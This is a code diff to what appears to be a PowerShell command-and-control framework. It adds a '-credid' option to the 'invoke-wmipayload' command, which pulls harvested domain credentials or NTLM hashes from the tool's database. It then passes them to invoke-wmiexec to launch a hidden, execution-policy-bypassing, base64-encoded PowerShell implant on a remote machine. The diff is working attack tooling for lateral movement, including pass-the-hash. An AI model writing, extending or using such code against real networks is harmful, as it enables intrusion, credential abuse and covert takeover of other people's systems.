@@ -2,7 +2,7 @@ import base64, re, traceback, os, sys, readline
 from Alias import ps_alias
 from Colours import Colours
 from Utils import validate_sleep_time
-from DB import new_task, update_sleep, get_history, select_item, update_label, unhide_implant, kill_implant, get_implantdetails, get_c2server_all, get_newimplanturl, get_allurls, get_sharpurls
+from DB import new_task, update_sleep, get_history, select_item, update_label, unhide_implant, kill_implant, get_implantdetails, get_c2server_all, get_newimplanturl, get_allurls, get_sharpurls, get_cred_by_id
 from AutoLoads import check_module_loaded, run_autoloads
 from Help import COMMANDS, posh_help, posh_help1, posh_help2, posh_help3, posh_help4, posh_help5, posh_help6, posh_help7, posh_help8
 from Config import PayloadsDirectory, POSHDIR, ROOTDIR, SocksHost
@@ -223,6 +223,22 @@ def handle_ps_command(command, user, randomuri, startup, createdaisypayload, cre
         payload = newPayload.CreateRawBase()
         params = re.compile("invoke-wmipayload ", re.IGNORECASE)
         params = params.sub("", command)
+        if "-credid" in command:
+            p = re.compile(r"-credid (\w*)")
+            credId = re.search(p, command)
+            if credId:
+                credId = credId.group(1)
+            else:
+                startup(user, "Please specify a credid")
+            creds = get_cred_by_id(credId)
+            if creds is None:
+                startup(user, "Unrecognised CredID: %s" % credId)
+            params = params.replace("-credid %s" % credId, "")
+            if creds['Password']:
+                params = params + "-domain %s -user %s -pass %s" % (creds['Domain'], creds['Username'], creds['Password'])
+            else:
+                params = params + "-domain %s -user %s -hash %s" % (creds['Domain'], creds['Username'], creds['Hash'])
+
         cmd = "invoke-wmiexec %s -command \"powershell -exec bypass -Noninteractive -windowstyle hidden -e %s\"" % (params, payload)
         new_task(cmd, user, randomuri)
 
